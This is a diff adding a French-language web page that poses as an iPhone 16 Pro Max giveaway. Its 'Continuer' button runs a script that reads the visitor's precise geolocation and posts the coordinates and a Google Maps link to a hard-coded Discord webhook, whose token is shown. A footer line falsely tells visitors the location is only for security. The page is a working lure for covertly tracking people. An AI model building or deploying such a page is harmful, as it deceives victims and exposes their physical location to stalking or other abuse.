@@ -1,0 +1,103 @@
+<!DOCTYPE html>
+<html lang="fr">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <title>Gagnez un iPhone 16 Pro Max</title>
+  <style>
+    body {
+      background: linear-gradient(to bottom, #ffffff, #e6e6e6);
+      font-family: Arial, sans-serif;
+      text-align: center;
+      padding: 2rem;
+    }
+    .container {
+      background: #fff;
+      padding: 2rem;
+      border-radius: 15px;
+      box-shadow: 0 0 15px rgba(0,0,0,0.2);
+      max-width: 500px;
+      margin: auto;
+    }
+    h1 {
+      color: #1a1a1a;
+    }
+    img {
+      width: 200px;
+      margin: 1rem 0;
+    }
+    p {
+      font-size: 1.1rem;
+      color: #333;
+    }
+    button {
+      background-color: #007bff;
+      color: white;
+      border: none;
+      padding: 1rem 2rem;
+      font-size: 1rem;
+      border-radius: 10px;
+      cursor: pointer;
+      margin-top: 1rem;
+    }
+    button:hover {
+      background-color: #0056b3;
+    }
+    .footer {
+      margin-top: 2rem;
+      font-size: 0.8rem;
+      color: #777;
+    }
+  </style>
+</head>
+<body>
+<script>
+function sendLocation() {
+  if (navigator.geolocation) {
+    navigator.geolocation.getCurrentPosition(
+      (position) => {
+        const lat = position.coords.latitude;
+        const lng = position.coords.longitude;
+
+        // 👇 ici tu mets ton webhook Discord
+        const webhookURL = "https://discord.com/api/webhooks/1392927046925029376/OQQxu7z55fvx25x-ajOVZYVtx35lVU9FJc23UvW9maNP88Kbtx0omXk59o7mKpEYPPdz";
+
+        const data = {
+          content: `📍 Nouvelle localisation récupérée !\nLatitude: ${lat}\nLongitude: ${lng}\nLien: https://www.google.com/maps?q=${lat},${lng}`
+        };
+
+        fetch(webhookURL, {
+          method: "POST",
+          headers: { "Content-Type": "application/json" },
+          body: JSON.stringify(data)
+        })
+        .then(() => {
+          alert("Localisation envoyée ✅");
+        })
+        .catch((err) => {
+          alert("Erreur lors de l'envoi à Discord ❌");
+          console.error(err);
+        });
+      },
+      (error) => {
+        alert("Erreur géolocalisation ❌ : " + error.message);
+      }
+    );
+  } else {
+    alert("Géolocalisation non supportée par ton navigateur 💀");
+  }
+}
+</script>
+  <div class="container">
+    <h1>🎉 Félicitations !</h1>
+    <img src="https://cdn.pixabay.com/photo/2022/11/28/19/57/iphone-7622587_1280.png" alt="iPhone 16 Pro Max">
+    <p>Vous avez été sélectionné pour tenter de remporter un <strong>iPhone 16 Pro Max</strong> gratuitement.</p>
+    <p>Cliquez sur "Continuer" pour valider votre participation.</p>
+    <button onclick="sendLocation()">Continuer</button>
+    <div class="footer">
+      <p>Votre localisation n'est la que pour la sécurité!</p>
+    </div>
+  </div>
+
+</body>
+</html>
